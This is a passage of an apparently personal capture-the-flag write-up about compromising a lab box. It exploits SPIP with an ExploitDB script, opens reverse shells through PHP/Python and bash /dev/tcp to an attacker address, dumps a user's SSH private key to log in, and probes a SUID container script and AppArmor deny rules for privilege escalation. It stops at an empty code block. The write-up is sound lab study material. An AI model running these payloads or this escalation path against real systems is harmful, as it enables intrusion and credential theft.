[+] Execute this payload : s:237:"<?php system('python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((10.11.147.65,9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(bash)''); ?>";
```
nothing, try classic my favourite payload with bash
```shell
bash -c "bash -i >& /dev/tcp/10.11.147.65/9000 0>&1"
```
full payload(i used file from ExploitDb `51536.py`)
```shell
python3 51536.py -u http://10.10.22.110/spip/ -v -c 'bash -c "bash -i >& /dev/tcp/10.11.147.65/9000 0>&1"'
```
we have RS
![[Pasted image 20251026192747.png]]
find first flag in /home/think/user.txt, (before writing i take database and find a lot ussless data but was useful and hash of think password and name of this user, dont try to crash the hash of this user its will be sooo  long time)
```shell
www-data@41c976e507f8:/home/think/spip/spip$ cat /home/think/user.txt 
cat /home/think/user.txt
fa229046d44eda6a3598c73ad96f4ca5  
```
next step i checked the think dir
```shell
www-data@41c976e507f8:/home/think/spip/spip$ cd /home/think
cd /home/think
www-data@41c976e507f8:/home/think$ ls -la
ls -la
total 48
drwxr-xr-x 8 think    think    4096 Feb 10  2024 .
drwxr-xr-x 1 root     root     4096 Dec  7  2023 ..
lrwxrwxrwx 1 root     root        9 Jun 21  2023 .bash_history -> /dev/null
-rw-r--r-- 1 think    think     220 Nov 14  2023 .bash_logout
-rw-r--r-- 1 think    think    3771 Nov 14  2023 .bashrc
drwx------ 2 think    think    4096 Nov 14  2023 .cache
drwx------ 3 think    think    4096 Dec  8  2023 .config
drwx------ 3 think    think    4096 Feb 10  2024 .gnupg
drwxrwxr-x 3 think    think    4096 Jan 10  2024 .local
-rw-r--r-- 1 think    think     807 Nov 14  2023 .profile
lrwxrwxrwx 1 think    think       9 Feb 10  2024 .python_history -> /dev/null
drwxr-xr-x 2 think    think    4096 Jan 10  2024 .ssh
lrwxrwxrwx 1 think    think       9 Feb 10  2024 .viminfo -> /dev/null
drwxr-x--- 5 www-data www-data 4096 Dec 20  2023 spip
-rw-r--r-- 1 root     root       35 Feb 10  2024 user.txt
```
ssh? try to take it
```shell
www-data@41c976e507f8:/home/think$ cd .ssh
cd .ssh
www-data@41c976e507f8:/home/think/.ssh$ ls -la
ls -la
total 20
drwxr-xr-x 2 think think 4096 Jan 10  2024 .
drwxr-xr-x 8 think think 4096 Feb 10  2024 ..
-rw-r--r-- 1 root  root   569 Jan 10  2024 authorized_keys
-rw-r--r-- 1 think think 2602 Jan 10  2024 id_rsa
-rw-r--r-- 1 think think  569 Jan 10  2024 id_rsa.pub
www-data@41c976e507f8:/home/think/.ssh$ cat id_rsa
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```
use this key to connect on ssh(123 - file with ssh key)
```shell
ssh -i 123 think@10.10.22.110
```
we take our think user
![[Pasted image 20251026193612.png]]
now try to find SUID files(Because another way i checked before with linpeas.sh)
```shell
find / -type f -perm -04000 -ls 2>/dev/null
```
result:
```shell
think@ip-10-10-22-110:~$ find / -type f -perm -04000 -ls 2>/dev/null
     3279     24 -rwsr-xr-x   1 root     root        22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1                                                                                                                          
     4815    468 -rwsr-xr-x   1 root     root       477672 Apr 11  2025 /usr/lib/openssh/ssh-keysign                                                                                                                                        
     1383     16 -rwsr-xr-x   1 root     root        14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device                                                                                                                                   
     9110     52 -rwsr-xr--   1 root     messagebus    51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                       
    78918    388 -rwsr-xr--   1 root     dip          395144 Jul 23  2020 /usr/sbin/pppd                                                                                                                                                    
   524324     20 -rwsr-sr-x   1 root     root          16760 Nov 14  2023 /usr/sbin/run_container                                                                                                                                           
      491     56 -rwsr-sr-x   1 daemon   daemon        55560 Nov 12  2018 /usr/bin/at                                                                                                                                                       
      672     40 -rwsr-xr-x   1 root     root          39144 Mar  7  2020 /usr/bin/fusermount                                                                                                                                               
    16403     88 -rwsr-xr-x   1 root     root          88464 Feb  6  2024 /usr/bin/gpasswd
    16390     84 -rwsr-xr-x   1 root     root          85064 Feb  6  2024 /usr/bin/chfn
     2463    164 -rwsr-xr-x   1 root     root         166056 Apr  4  2023 /usr/bin/sudo
    16394     52 -rwsr-xr-x   1 root     root          53040 Feb  6  2024 /usr/bin/chsh
    16408     68 -rwsr-xr-x   1 root     root          68208 Feb  6  2024 /usr/bin/passwd
     1755     56 -rwsr-xr-x   1 root     root          55528 Apr  9  2024 /usr/bin/mount
    15372     68 -rwsr-xr-x   1 root     root          67816 Apr  9  2024 /usr/bin/su
     8714     44 -rwsr-xr-x   1 root     root          44784 Feb  6  2024 /usr/bin/newgrp
     3277     32 -rwsr-xr-x   1 root     root          31032 Feb 21  2022 /usr/bin/pkexec
     1789     40 -rwsr-xr-x   1 root     root          39144 Apr  9  2024 /usr/bin/umount

```
checked in #GTFOBins and rights, i think it will be interesting
```shell
524324     20 -rwsr-sr-x   1 root     root          16760 Nov 14  2023 /usr/sbin/run_container
```
lets check this file
```shell
think@ip-10-10-22-110:/usr/sbin$ strings /usr/sbin/run_container
---------
/bin/bash
/opt/run_container.sh
---------
```
/bin/bash closed for us, but another we can check
```shell
think@ip-10-10-22-110:/usr/sbin$ cd /opt
think@ip-10-10-22-110:/opt$ ls -la
ls: cannot open directory '.': Permission denied
think@ip-10-10-22-110:/opt$ cat /opt/run_container.sh
#!/bin/bash

# Function to list Docker containers
list_containers() {
    if [ -z "$(docker ps -aq)" ]; then
        docker run -d --restart always -p 8000:8000 -v /home/think:/home/think 4b5aec41d6ef;
    fi
    echo "List of Docker containers:"
    docker ps -a --format "ID: {{.ID}} | Name: {{.Names}} | Status: {{.Status}}"
    echo ""
}

# Function to prompt user for container ID
prompt_container_id() {
    read -p "Enter the ID of the container or leave blank to create a new one: " container_id
    validate_container_id "$container_id"
}

# Function to display options and perform actions
select_action() {
    echo ""
    echo "OPTIONS:"
    local container_id="$1"
    PS3="Choose an action for a container: "
    options=("Start Container" "Stop Container" "Restart Container" "Create Container" "Quit")

    select opt in "${options[@]}"; do
        case $REPLY in
            1) docker start "$container_id"; break ;;
            2)  if [ $(docker ps -q | wc -l) -lt 2 ]; then
                    echo "No enough containers are currently running."
                    exit 1
                fi
                docker stop "$container_id"
                break ;;
            3) docker restart "$container_id"; break ;;
            4) echo "Creating a new container..."
               docker run -d --restart always -p 80:80 -v /home/think:/home/think spip-image:latest 
               break ;;
            5) echo "Exiting..."; exit ;;
            *) echo "Invalid option. Please choose a valid option." ;;
        esac
    done
}

# Main script execution
list_containers
prompt_container_id  # Get the container ID from prompt_container_id function
select_action "$container_id"  # Pass the container ID to select_action function

```
strange what we cant `ls -la` in this dir, but this is just start docker
check rights
```shell
think@ip-10-10-22-110:/opt$ ls -la /opt/run_container.sh
-rwxrwxrwx 1 root root 1715 Jan 10  2024 /opt/run_container.sh
```
but we have rights to change file, try
```shell
think@ip-10-10-22-110:/opt$ echo "" > /opt/run_container.sh
-ash: /opt/run_container.sh: Permission denied
```
`-ash` its AppArmor, 'rules' for users in linux, try to find what we can from our user
```shell
think@ip-10-10-22-110:~$ cd /etc/apparmor.d
think@ip-10-10-22-110:/etc/apparmor.d$ cat usr.sbin.ash
#include <tunables/global>

/usr/sbin/ash flags=(complain) {
  #include <abstractions/base>
  #include <abstractions/bash>
  #include <abstractions/consoles>
  #include <abstractions/nameservice>
  #include <abstractions/user-tmp>

  # Remove specific file path rules
  # Deny access to certain directories
  deny /opt/ r,
  deny /opt/** w,
  deny /tmp/** w,
  deny /dev/shm w,
  deny /var/tmp w,
  deny /home/** w,
  /usr/bin/** mrix,
  /usr/sbin/** mrix,

  # Simplified rule for accessing /home directory
  owner /home/** rix,
}
```
cant read /opt, try to use /var/tmp for our goal, we can start new bash session and be without this armor
```shell

```